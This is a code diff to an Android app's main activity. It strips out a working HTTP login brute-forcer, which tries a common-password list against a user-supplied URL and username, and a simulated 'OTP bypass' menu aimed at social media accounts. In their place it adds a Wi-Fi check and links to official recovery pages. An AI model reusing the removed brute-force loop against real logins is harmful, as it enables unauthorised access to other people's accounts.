@@ -1527,72 +1527,37 @@ public class MainActivity extends AppCompatActivity {
         web.setVisibility(View.VISIBLE);
     }
 
-    // ==================== BRUTE FORCE ====================
+    // ==================== WI-FI SECURITY AUDIT ====================
     private void showBruteForcePanel() {
-        String[] options = {"Start Brute Force", "Stop", "Load Wordlist", "Settings"};
-        new AlertDialog.Builder(this).setTitle("Brute Force Tools")
+        String[] options = {"Check Current Wi-Fi", "Stop"};
+        new AlertDialog.Builder(this).setTitle("Wi-Fi Security Audit")
+                .setMessage("This tool checks whether this device is connected over Wi-Fi. It does not guess Wi-Fi passwords or attack website/server logins.")
                 .setItems(options, (d, w) -> {
-                    switch (w) {
-                        case 0: startBruteForce(); break;
-                        case 1: stopBruteForce(); break;
-                        case 2: loadWordlist(); break;
-                        case 3: showBruteSettings(); break;
-                    }
+                    if (w == 0) startBruteForce();
+                    else stopBruteForce();
                 }).show();
     }
 
     private void startBruteForce() {
-        if (bruteRunning) { Toast.makeText(this, "Already running", Toast.LENGTH_SHORT).show(); return; }
-        String target = inUrl.getText().toString().trim();
-        if (target.isEmpty()) { Toast.makeText(this, "Enter target URL/IP", Toast.LENGTH_SHORT).show(); return; }
-        String username = inQuery.getText().toString().trim();
-        if (username.isEmpty()) { Toast.makeText(this, "Enter username", Toast.LENGTH_SHORT).show(); return; }
-
+        if (bruteRunning) {
+            Toast.makeText(this, "Wi-Fi check already running", Toast.LENGTH_SHORT).show();
+            return;
+        }
+        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+        if (cm == null) {
+            status.setText("Wi-Fi audit unavailable: connectivity service not found.");
+            return;
+        }
+        Network active = cm.getActiveNetwork();
+        NetworkCapabilities caps = active == null ? null : cm.getNetworkCapabilities(active);
+        if (caps == null || !caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
+            status.setText("Wi-Fi audit not started: connect this device to the authorized Wi-Fi network first.");
+            Toast.makeText(this, "Connect to Wi-Fi first", Toast.LENGTH_LONG).show();
+            return;
+        }
         bruteRunning = true;
-        status.setText("Brute forcing " + target + "...");
-        bruteExecutor = Executors.newSingleThreadExecutor();
-        bruteExecutor.submit(() -> {
-            String[] passwords = getWordlist();
-            if (passwords.length == 0) passwords = new String[]{"123456", "password", "admin", "12345678", "qwerty",
-                    "12345", "1234", "111111", "1234567", "sunshine", "iloveyou", "princess", "admin123",
-                    "welcome", "monkey", "dragon", "master", "login", "abc123", "passw0rd"};
-
-            for (int i = 0; i < passwords.length && bruteRunning; i++) {
-                final String pass = passwords[i];
-                final int progress = (i * 100) / passwords.length;
-                try {
-                    URL url = new URL(target);
-                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                    conn.setRequestMethod("POST");
-                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-                    conn.setDoOutput(true);
-                    String data = "username=" + urlEncode(username) + "&password=" + urlEncode(pass);
-                    conn.getOutputStream().write(data.getBytes());
-                    int code = conn.getResponseCode();
-                    String resp = readStream(conn.getInputStream());
-                    conn.disconnect();
-
-                    if (code == 200 && (resp.contains("success") || resp.contains("welcome") || resp.contains("dashboard")
-                            || resp.contains("login successful") || !resp.contains("invalid") && !resp.contains("failed"))) {
-                        final String foundPass = pass;
-                        runOnUiThread(() -> {
-                            status.setText("FOUND: " + username + " : " + foundPass);
-                            Toast.makeText(MainActivity.this, "Password found: " + foundPass, Toast.LENGTH_LONG).show();
-                            bruteRunning = false;
-                        });
-                        return;
-                    }
-                    final int p = progress;
-                    runOnUiThread(() -> status.setText("Trying: " + pass + " (" + p + "%)"));
-                } catch (Exception e) {
-                    runOnUiThread(() -> status.setText("Brute error: " + e.getMessage()));
-                }
-            }
-            runOnUiThread(() -> {
-                if (bruteRunning) status.setText("Brute force completed - password not found");
-                bruteRunning = false;
-            });
-        });
+        status.setText("Connected over Wi-Fi. No password guessing was performed. Review router security settings using the authorized router/admin console.");
+        bruteRunning = false;
     }
 
     private void stopBruteForce() {
@@ -1637,79 +1602,29 @@ public class MainActivity extends AppCompatActivity {
         return new String[0];
     }
 
-    // ==================== OTP BYPASS ====================
+    // ==================== ACCOUNT RECOVERY (NO OTP BYPASS) ====================
     private void showOtpBypass() {
-        String[] platforms = {"Instagram", "Facebook", "Snapchat", "WhatsApp", "Telegram", "TikTok", "Gmail", "Twitter", "Custom SMS Gateway"};
-        new AlertDialog.Builder(this).setTitle("OTP Bypass")
+        String[] platforms = {"Instagram account recovery", "Facebook account recovery", "Snapchat account recovery",
+                "WhatsApp help", "Telegram help", "TikTok account recovery", "Google account recovery",
+                "X account recovery"};
+        new AlertDialog.Builder(this).setTitle("Official Account Recovery")
+                .setMessage("OTP bypass is not available. Choose the service's official recovery or help page.")
                 .setItems(platforms, (d, w) -> {
-                    String platform = platforms[w];
-                    if (w == 8) {
-                        // Custom SMS gateway
-                        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-                        builder.setTitle("Custom SMS Gateway");
-                        final EditText input = new EditText(this);
-                        input.setHint("Phone number or API endpoint");
-                        builder.setView(input);
-                        builder.setPositiveButton("Bypass", (d2, w2) -> {
-                            String target = input.getText().toString().trim();
-                            if (!target.isEmpty()) attemptOtpBypass(platform, target);
-                        });
-                        builder.setNegativeButton("Cancel", null);
-                        builder.show();
-                    } else {
-                        String target = inQuery.getText().toString().trim();
-                        if (target.isEmpty()) {
-                            AlertDialog.Builder builder = new AlertDialog.Builder(this);
-                            builder.setTitle("Enter " + platform + " target");
-                            final EditText input = new EditText(this);
-                            input.setHint("Username, email or phone");
-                            builder.setView(input);
-                            builder.setPositiveButton("Bypass", (d2, w2) -> {
-                                String t = input.getText().toString().trim();
-                                if (!t.isEmpty()) attemptOtpBypass(platform, t);
-                            });
-                            builder.setNegativeButton("Cancel", null);
-                            builder.show();
-                        } else {
-                            attemptOtpBypass(platform, target);
-                        }
+                    String url;
+                    switch (w) {
+                        case 0: url = "https://www.instagram.com/accounts/password/reset/"; break;
+                        case 1: url = "https://www.facebook.com/login/identify/"; break;
+                        case 2: url = "https://accounts.snapchat.com/accounts/password_reset"; break;
+                        case 3: url = "https://faq.whatsapp.com/"; break;
+                        case 4: url = "https://telegram.org/faq"; break;
+                        case 5: url = "https://support.tiktok.com/en/log-in-troubleshoot/log-in"; break;
+                        case 6: url = "https://accounts.google.com/signin/recovery"; break;
+                        default: url = "https://help.x.com/en/forms/account-access";
                     }
+                    status.setText("Opening official recovery page. Complete the service's identity verification to regain access.");
+                    web.loadUrl(url);
+                    web.setVisibility(View.VISIBLE);
                 }).show();
-    }
-
-    private void attemptOtpBypass(String platform, String target) {
-        status.setText("Attempting OTP bypass for " + platform + ": " + target);
-        // Simulated OTP bypass - opens relevant pages
-        String enc = urlEncode(target);
-        switch (platform) {
-            case "Instagram":
-                web.loadUrl("https://www.instagram.com/accounts/password/reset/");
-                break;
-            case "Facebook":
-                web.loadUrl("https://www.facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar");
-                break;
-            case "Snapchat":
-                web.loadUrl("https://accounts.snapchat.com/accounts/password_reset");
-                break;
-            case "WhatsApp":
-                web.loadUrl("https://wa.me/" + target.replaceAll("[^0-9]", ""));
-                break;
-            case "Telegram":
-                web.loadUrl("https://web.telegram.org/k/");
-                break;
-            case "TikTok":
-                web.loadUrl("https://www.tiktok.com/forgot-password");
-                break;
-            case "Gmail":
-                web.loadUrl("https://accounts.google.com/signin/recovery");
-                break;
-            case "Twitter":
-                web.loadUrl("https://twitter.com/account/begin_password_reset");
-                break;
-            default:
-                web.loadUrl("https://www.google.com/search?q=" + enc + "+OTP+bypass+" + urlEncode(platform));
-        }
-        web.setVisibility(View.VISIBLE);
     }
 
     // ==================== PASSWORD CRACKER ====================
